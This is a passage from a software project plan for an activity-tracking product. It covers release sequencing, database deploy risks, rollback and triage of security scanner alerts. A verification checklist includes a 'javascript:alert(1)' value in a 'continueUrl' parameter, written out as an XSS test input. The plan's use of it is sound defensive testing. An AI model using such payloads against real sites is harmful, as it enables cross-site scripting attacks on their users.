Alert-phase labels (S1…S8) are **§37's**, which replaced §10's.

```
 1. #4 S1  §8.1 auth-page XSS/redirect ............. independent, only exploitable one
 2. #4 S2  §35 remove committed .exe installers .... independent, fixes a live distribution bug
 3. #4 S3  pin Actions + Dockerfile base images .... independent, clears ~72 alerts
 4. #4 S4  §8.7 dependency bumps (npm) ............. independent
 5. #1     browser→URL resolver + §1.5 + §1.6 ...... foundation for #2 and #7
 6. #3     screenshot activity edit ................ → #1 (same feed/route)
 7. #4 S5  Dockerfile USER + §8.4 workflow perms ... independent
    #4 S6  §8.2, §8.3, §8.5, §8.6 remaining fixes .. §8.2 gated on D2 check
 8. #6     ownership + credits (UI) ................ independent
 9. ── one single agent release (§26 C3) ──
      #5 A4  UIAutomation (replaces PowerShell)
      #5 A5  trim VM detection
      #5 A7  install mode (only if self-service — D3)
      #2     URL on screenshot events ............. → #1, → A4
      #7     classification cache ................. → #1 (+ §19.3 test)
      #4 S4  cargo update -p glib
10. #5 A6  transparency docs + #6 content .......... after the agent is stable
11. #4 S7  §36 tune security.yml ................... after the real fixes land
12. #4 S8  §9 + §33 dismiss with written reasons ... last (§37: S7 before S8)
```

**Steps 1–8 are backend/web/CI and ship continuously.** Step 9 is one release
(§26 C3). Steps 11–12 come last so the queue is tuned and dismissed against
its final state, not re-triaged twice.

**Why S2 moved this early:** §35 is a live bug — both sites are serving a
21-version-old installer — and Issue #5's A0 check is invalid until it is
fixed, because A0 would otherwise test the stale binary.

## 26. Cross-issue collisions

### C1 🔴 A4 and Issue #2 rewrite the same function

§13.2 (A4) replaces `read_browser_url`'s PowerShell path with UIAutomation.
§2.1 caches the last URL from that same call for screenshot events.

Done separately, the second rewrites the first. **A4 lands first, and #2's
cache is built on the new implementation** — or both go in one change. Doing
#2 first means throwing that work away.

### C2 🟠 Issues #1 and #3 edit the same route and the same row shape

Both modify the `feedType === "screenshots"` branch of
[routes.js:1135](Dashboard-Backend/src/modules/activity/routes.js:1135) and
both extend the screenshot row (`matchedDomain` from #1, edit markers from
#3), plus the `Screenshot` interface in
[screenshots.tsx](Dashboard-Web/features/activity/components/screenshots.tsx).

Not a logical conflict, purely a merge one — **sequence them (#1 then #3)
rather than running both in parallel branches.**

### C3 🟠 All agent work must be one release, not four

Issues #2, #5 (A4/A5/A7), #7 and #4 §8.7 all touch the agent. Every release
is a **3-platform matrix build**, and the workflow's own comment records that
Windows runs at 2× and macOS at 10× the Linux runner-minute cost — which is
exactly why releases were made manual.

Four separate releases is four full matrix builds and four rounds of
"does AV still flag it". **Batch them.** It also means the AV outcome is
measured once, with all the behavioural fixes present, instead of attributing
a change to the wrong one.

> Working-tree note: `src-tauri/Cargo.toml` is already modified and not by me.
> Resolve that before the agent branch, or it tangles with §8.7's `Cargo.lock`
> bump.

### C4 🔴 Do **not** apply Issue #1's resolver to the integrity sweep

The most subtle finding in this review.

**Browser wall-clock seconds are recorded in two tables at once.** The agent
emits an app slice *and* a URL slice on the same 15-second tick
([tracker.rs:1143](Tauri-App-Extension/src-tauri/src/agent/tracker.rs:1143)),
so 15 seconds of Chrome on `reddit.com` exists as 15s in `activity_app_logs`
**and** 15s in `activity_url_logs`.

The integrity sweep sums **both** tables into one
`distractingBySession` total
([integrity-sweep.service.js:102-115](Dashboard-Backend/src/modules/activity/integrity-sweep.service.js:102)).
It avoids double-counting today only by accident: "Google Chrome" is
`unclassified`, so the app row is skipped and only the URL row counts.

**Issue #1 removes that accidental protection.** If the shared resolver is
applied there, the browser app row inherits `distracting` from the domain,
both rows count, and every distracting-browsing session reports **double** the
real seconds — pushing sessions over `CATEGORY_CONFLICT_MIN_SECONDS` that
should never have flagged.

**Decision: the sweep keeps its own `categorize()` and is explicitly left out
of the shared resolver, with a comment saying why.** If it is ever unified,
it must first de-duplicate browser app-time against URL-time for the same
session and window. Put that in the code, not just here.

### C5 🟡 Issue #7's security model depends on Issue #1

§19.2's argument — "tampering with the local cache changes nothing" — holds
because the server resolves categories at read time. That is Issue #1.

It is also true *today* (the agent has never sent a category), so #7 is not
blocked. But **the §19.3 invariant test must land with #7's first phase**, not
after — it is the thing that keeps the argument true.

## 27. Deploy-time aftermath

### D1 🔴 The new index can freeze the agent ingest on startup

§1.5 M3 adds an index on `activity_url_logs`. A plain `CREATE INDEX` takes an
`ACCESS EXCLUSIVE` lock — **every write to that table blocks until it
finishes**, which on a table with millions of rows is minutes, and it happens
during boot, so the backend looks hung and agents fail to post events.

Good news, verified: `ensure-lookup-schema.js` runs its statements
sequentially and **not inside a transaction**
([ensure-lookup-schema.js:1721](Dashboard-Backend/src/lib/postgres/ensure-lookup-schema.js:1721)),
so `CONCURRENTLY` is available:

```sql
CREATE INDEX CONCURRENTLY IF NOT EXISTS idx_act_url_session_visited
  ON activity_url_logs (session_id, visited_at);
```

**Gotcha to handle:** a `CONCURRENTLY` build that fails midway leaves an
**INVALID** index, and `IF NOT EXISTS` then skips it forever — the index looks
present and is never used. Add a check that drops an invalid index of that
name before creating, or verify once after deploy:

```sql
SELECT indexrelid::regclass FROM pg_index WHERE NOT indisvalid;
```

### D2 🟠 §8.2's TLS change can break a working deployment

Today `disableTlsVerificationInDev: !isProduction` means: if `NODE_ENV` is not
`production` in the Coolify container, TLS verification is **currently off**.
If anything in that deployment depends on it — an internal service with a
self-signed certificate, a proxy with a private CA — then requiring an
explicit `DISABLE_TLS_VERIFY=true` will **start failing outbound calls that
work today**.

**Before shipping §8.2, confirm `NODE_ENV=production` is actually set in the
deployed environment.** If it is, the change is a no-op in prod and pure
hardening. If it is not, that is itself the finding, and the fix is setting
`NODE_ENV` — not keeping the bypass.

### D3 🟠 A7 strands existing installs

`perMachine` → `currentUser` changes the install location from
`Program Files` to `%LOCALAPPDATA%`. An existing per-machine install does not
migrate itself: users can end up with **two installs**, or an updater that
cannot write to its own directory.

If A7 is taken, it needs either a one-time uninstall/reinstall instruction or
an installer that removes the old per-machine entry. **Do not ship A7 quietly
to an existing user base** — this is the one item in §14.1 with a migration
cost attached.

### D4 ✅ Schema additions are safe

Issue #2's `url`/`domain` and Issue #3's four `activity_level_*` columns are
all nullable `ADD COLUMN IF NOT EXISTS` — metadata-only in modern Postgres, no
table rewrite, no lock of consequence. These are fine on every boot.

## 28. Behavioural aftermath — what changes for users the day it deploys

| # | Effect | Handling |
|---|---|---|
| **E1** | **Reported productivity jumps.** Browser time that read `unclassified`→neutral becomes productive or distracting overnight. For heavy-browser teams this is a large, visible swing on historical data | Intended, and the point of Issue #1 — but announce it. §1.6 M2/M3 (export stamp + reclassification notice) exist so it is explainable, not mysterious |
| **E2** | **Double-count hazard for any future consumer.** Browser seconds live in both log tables (C4). Anything that sums app-time and URL-time together will overcount browser sessions | Document it at both insert sites. Today only the sweep sums both, and C4 keeps it correct |
| **E3** | **Integrity flag volume may move** once categories are more accurate | Watch `activity_integrity_flags` for the first week after Issue #1. A spike is a signal that C4's reasoning needs re-checking, not that people suddenly cheated |
| **E4** | **Edited screenshots vs anti-cheat** | Already handled: §3.1 forces integrity queries onto `COALESCE(activity_level_original, activity_level)` — **this must ship in the same PR as the edit feature**, never after |
| **E5** | **Agent shows real app names offline** after #7 — a visible improvement users will notice | No action, just expect it |
| **E6** | **AV outcome is measured once**, after the single batched release (C3) | Test the *installer from the release*, not a local build — local builds differ |

## 29. Branch sync map

Per the standing workflow (feature branch → `main` → per-service production
branches, zero-drift verified before overwrite):

Existing production branches: `DashboardBackend-Prod`, `dashboard-web-production`,
`Auth-Production`, `LandingWeb-Prod`, `LandingWebBackend-Prod`.
The agent ships via GitHub Releases, not a branch.

| Issue / phase | Touches | Production branches to sync |
|---|---|---|
| #1 | Dashboard-Backend, Dashboard-Web | `DashboardBackend-Prod`, `dashboard-web-production` |
| #2 | Dashboard-Backend, Tauri | `DashboardBackend-Prod` + agent release |
| #3 | Dashboard-Backend, Dashboard-Web | `DashboardBackend-Prod`, `dashboard-web-production` |
| #4 **S1** §8.1 | Dashboard-Backend, Auth-Backend *(byte-identical file)* | `DashboardBackend-Prod`, `Auth-Production` |
| #4 **S2** §35 | Dashboard-Web, Landing-Web *(+ download links)* | `dashboard-web-production`, `LandingWeb-Prod` |
| #4 **S3** pinning | `.github` only | none — CI config lives on `main` |
| #4 **S4** deps | Dashboard-Web, Tauri | `dashboard-web-production` + agent release |
| #4 **S5** Dockerfiles | Auth-Backend, Dashboard-Backend, Landing-Backend, Dashboard-Web, Landing-Web | `Auth-Production`, `DashboardBackend-Prod`, `LandingWebBackend-Prod`, `dashboard-web-production`, `LandingWeb-Prod` — **widest fan-out in the plan** |
| #4 **S6** §8.2/8.3/8.5/8.6 | Dashboard-Backend, Auth-Backend, Notify-backend, Dashboard-Web, Landing-Web | as above, **minus** the Notify question below |
| #5 | Tauri, `.github` | agent release only |
| #6 | Tauri, Dashboard-Web | `dashboard-web-production` + agent release |
| #7 | Dashboard-Backend, Tauri | `DashboardBackend-Prod` + agent release |

**Two things to resolve before syncing:**

1. **Notify-backend has no production branch** in the remote list, yet §8.3
   (email bodies in logs) and one Dockerfile fix land there. Confirm how that
   service deploys before shipping either.
2. **S5 touches five services at once.** Consider splitting it per-service
   rather than one commit fanning out to five production branches — the
   zero-drift verification is per-file, and a five-way sync is where drift
   gets missed.

## 30. Rollback

| Change | Reversible? |
|---|---|
| #1 resolver | ✅ Pure read-path. Revert the deploy and old numbers return |
| #1 index | ✅ `DROP INDEX CONCURRENTLY` |
| #1 cache | ✅ Revert |
| #3 edit feature | ⚠️ Code reverts cleanly, but **already-applied edits persist**. `activity_level_original` is what makes them undoable — that column is the rollback plan |
| #2/#7 agent | ⚠️ Requires publishing a previous version; users on the new build stay until they update |
| #5 A7 install mode | ❌ **Effectively one-way** — see D3 |
| #4 S1/S5/S6 code fixes | ✅ All revertible |
| #4 S2 removing installers | ✅ Files stay in git history; restorable. **But do not restore them** — fix the download links instead (§35) |
| #4 S3 action pinning | ✅ Revertible, and a pinned SHA cannot break retroactively — the risk is the opposite: pinned actions stop receiving upstream fixes, so schedule a periodic re-pin |
| #4 S7 `security.yml` tuning | ✅ Revertible. Suppressed alerts reappear on the next scan if the thresholds are restored |
| #4 S8 alert dismissals | ✅ Reopenable in GitHub |

## 31. Definition of done

**Product**
- [ ] Apps and URLs tabs report the **same** productive percentage for the same browser seconds (the §0.2 contradiction is gone)
- [ ] A screenshot edit updates only its capture run; idle gaps hold on both sides
- [ ] Integrity flags computed on original, never edited, activity levels
- [ ] Agent shows real app names after a cold start with no network
- [ ] `ActivityEvent` still carries no category field — enforced by test
- [ ] About panel shows owner + both developers, version read at runtime

**Correctness / ops**
- [ ] `SELECT indexrelid::regclass FROM pg_index WHERE NOT indisvalid` returns nothing after deploy (D1)
- [ ] `NODE_ENV=production` confirmed in the deployed environment **before** §8.2 ships (D2)
- [ ] 493+ existing tests green; new resolver / run-splitting / `buttonHref` tests added
- [ ] One agent release contains **all** agent-side work (C3)
- [ ] Integrity-flag volume checked for a week after #1 deploys (E3)
- [ ] Every touched production branch synced, zero-drift verified (§29)

**Security**
- [ ] `?continueUrl=javascript:alert(1)` on the auth action page produces an inert button — **in both copies of the file**
- [ ] `/downloads/*.exe` no longer serves a stale build; both sites link to the current release (§35)
- [ ] Issue #5's A0 signature check run against the **GitHub release artifact**, not a committed `.exe`
- [ ] All GitHub Actions pinned to SHAs; Dockerfile base images pinned
- [ ] Containers no longer run as root
- [ ] `security.yml` tuned (§36) — alert count in the 60–90 range, not 592
- [ ] Remaining open alerts are only the ones deliberately accepted, each with a written reason
- [ ] Nothing dismissed that was not actually triaged

---

# Part IV — Security alerts revised: 592 code scanning + 3 Dependabot

Issue #4 was written against **36** CodeQL alerts. The count is now **592**.
Before rewriting anything I queried the API rather than assuming, and the
headline is:

> **This is not 556 new bugs. It is 8 additional scanners, newly enabled,
> reporting on the same code — and CodeQL is still exactly 36.**
> The §8/§9 triage remains valid and unchanged.

## 32. What the 592 actually are

All 592 are on `refs/heads/main` (not duplicated across branches — I checked
that first). They come from **nine tools**, because a new
`.github/workflows/security.yml` now uploads SARIF from eight more:

| Tool | Alerts | Character |
|---|---|---|
| **Bearer** | 229 | Privacy/PII scanner — 174 are `javascript_lang_logger_leak` |
| **devskim** | 119 | 99 are severity `note` — informational |
| **Semgrep OSS** | 77 | Mixed; includes the secret-pattern hits |
| **Scorecard** | 56 | Repo *posture*, not code bugs (unpinned deps, token perms) |
| **CodeQL** | **36** | ← **unchanged**; the set already triaged in §8/§9 |
| **nodejsscan** | 26 | Node-specific patterns |
| **osv-scanner** | 23 | Dependency vulns — overlaps Dependabot |
| **clippy** | 23 | Rust *style* lints, not security |
| **Trivy** | 3 | Container/dependency vulns |

## 33. Root-cause consolidation — 592 alerts, ~5 causes worth acting on

| Root cause | Alerts | Verdict |
|---|---|---|
| **Unpinned GitHub Actions + Dockerfile `FROM` tags** — `PinnedDependenciesID` 41 + `mutable-action-tag` 31 | **~72** | ✅ Fix. One change to two workflow files + five Dockerfiles |
| **Bearer logger-leak in dev scripts** — 59 of the 174 are in `Dashboard-Backend/scripts` alone | ~59 | ⛔ Dismiss as a group — same reasoning as §9's `sync-firebase-local.mjs`: local dev tooling, never deployed |
| **devskim `note`-severity** | 99 | ⛔ Informational. Dismiss or downgrade the tool's threshold |
| **clippy style lints** | 23 | ⛔ Not security. Should never have been in this queue (§36) |
| **Secret-pattern hits** | 18 | ⛔ **All verified false positives** — see §34.1 |
| **Containers run as root** — `DS-0002` ×3 + `dockerfile.missing-user` ×3 | 6 | ✅ Fix. Add `USER` to 3–5 Dockerfiles |
| **Committed `.exe` installers** — `BinaryArtifactsID` | 4 | 🔴 **Fix, and it is a real bug** — §35 |
| **Workflow token permissions** — `TokenPermissionsID` | 3 | ✅ Already §8.4 |
| **Everything else** (CodeQL 36, osv/Trivy dependency vulns, misc) | ~62 | Already covered by §8/§9 and §8.7 |

**Four new fixes clear roughly 85 alerts. Around 200 more are dismissals.**

## 34. Verifications I ran

### 34.1 ✅ No committed credentials — the one thing that could have been urgent

18 alerts matched secret patterns. I checked every distinct location:

| Location | Reality |
|---|---|
| `*/.env.example` (×8), `firebase-admin.local.json.example` (×2), `docs/auth-backend/README.md` | **Template placeholders.** That is what those files are for |
| `Dashboard-Backend/src/config/firebase.js:190`, `Auth-Backend/…:190` | `creds.type !== "service_account"` — a **type check**. The literal string matched the pattern |
| `*/src/config/firebase.js:108` | `apiKey: pick(web.apiKey, "apiKey")` — reads from config, hardcodes nothing |
| `Notify-backend/…/notify-log.service.js:5` | `"password-updated": "10 minutes"` — an **email cooldown key** |
| `Auth-Backend/src/config/password-policy/definition.js:1,3` | A password *policy* definition. No password |

**Nothing is leaked. No rotation needed.**

### 34.2 The scanner workflow is the largest single source of alerts about itself

**47 of the 72 unpinned-dependency alerts are in `.github/workflows/security.yml`** —
the newly added file that enabled the eight scanners. It uses unpinned actions
and is therefore its own biggest complainant. Pinning it is the single
highest-yield edit in this entire section.

## 35. 🔴 Four committed installers — stale, public, and unsigned

`BinaryArtifactsID` flagged four `.exe` files that are **tracked in git**:

```
Dashboard-Web/public/downloads/VirtualTrackerAgent-setup.exe          3,852,735 B
Dashboard-Web/public/downloads/VirtualTrackerAgent_0.4.0_x64-setup.exe 3,852,735 B
Landing-Web/public/downloads/VirtualTrackerAgent-setup.exe            3,678,109 B
Landing-Web/public/downloads/VirtualTrackerAgent_0.4.0_x64-setup.exe  3,678,109 B
```

This is not just repo hygiene. Three real problems:

1. **They are version 0.4.0. The current agent is 0.4.21.** Anyone hitting
   `/downloads/VirtualTrackerAgent-setup.exe` on either site downloads an agent
   **21 versions out of date** — because `public/` in a Next.js app is served
   directly. The release workflow publishes to GitHub Releases and
   Landing-Backend serves from `releases/latest`, so these static copies are a
   second, stale, un-updated distribution path nobody is maintaining.
2. **The two sites serve different binaries under the same filename**
   (3,852,735 vs 3,678,109 bytes) — so "the installer" means two different
   things depending on which site you got it from.
3. **It corrupts Issue #5's testing.** Any AV check run against a downloaded
   `/downloads/…exe` is testing a stale unsigned binary, not the current
   release. §14's A0 check must use the **GitHub release artifact**, not these.

**Fix:** delete all four from git, add `public/downloads/*.exe` to
`.gitignore`, and point both sites' download links at the GitHub release the
Landing-Backend already resolves. ~15 MB leaves the repo as a bonus.

> Note: deleting them removes them going forward; they remain in git history.
> Since they contain no secrets, history rewriting is not warranted.

## 36. Recommendation — tune `security.yml`, it is currently net-negative

Nine overlapping scanners produced **592 alerts for roughly 13 genuinely
actionable issues**. That is a ~2% signal rate, and it has a real cost:
**§8.1's exploitable auth-page XSS is now buried in a list of 592**, which is
precisely how a critical finding goes unnoticed.

Suggested trimming, in order:

1. **Drop clippy from SARIF upload.** Style lints belong in CI output, not the
   security queue. −23.
2. **Raise the severity floor** to `warning`+ for devskim and Bearer. −~150
   `note`-level entries, no loss of real coverage.
3. **Pick one of Semgrep / Bearer / nodejsscan** for JS. Three tools finding
   the same patterns triples the noise for near-identical coverage.
4. **Keep CodeQL, osv-scanner, Trivy, Scorecard.** These are distinct and
   non-overlapping: semantic analysis, dependency CVEs, containers, posture.
5. **Pin the actions in `security.yml`** while editing it (§34.2). −47.

Expected result: **roughly 60–90 meaningful alerts instead of 592**, with the
real ones visible.

## 37. Revised Issue #4 plan

Replaces §10's phasing; §8 and §9 stand unchanged.

| Phase | Content | Alerts cleared |
|---|---|---|
| **S1** | §8.1 auth-page XSS/redirect (unchanged — still the only exploitable one) | 4 |
| **S2** | §35 remove committed installers + fix both sites' download links | 4 + a real distribution bug |
| **S3** | Pin all GitHub Actions to SHAs in `security.yml` + `release.yml`; pin Dockerfile base images | ~72 |
| **S4** | §8.7 dependency bumps (browserslist, glib) — also clears overlapping osv-scanner/Trivy entries | 3 + overlap |
| **S5** | Add `USER` to the Dockerfiles; §8.4 workflow permissions | 9 |
| **S6** | §8.2, §8.3, §8.5, §8.6 remaining CodeQL fixes | ~8 |
| **S7** | §36 tune `security.yml` | ~200 suppressed at source |
| **S8** | Dismiss the rest with written reasons (§9 + §33) | remainder |

**S7 before S8.** Tuning the workflow at the source is better than dismissing
hundreds of alerts one at a time — dismissals are per-alert and come back on
the next scan of a changed file; a threshold change does not.

## 38. What this does not change

- **CodeQL is still 36.** Every conclusion in §8 and §9 holds exactly as written.
- **Dependabot is still 3** (§8.7) — browserslist ×2, glib ×1.
- **The one genuinely exploitable finding is still §8.1**, the auth-page
  `continueUrl` XSS/open-redirect. Nothing in the other 556 outranks it.
- Priority order in §25 is unchanged; §37 just replaces §10 inside it.
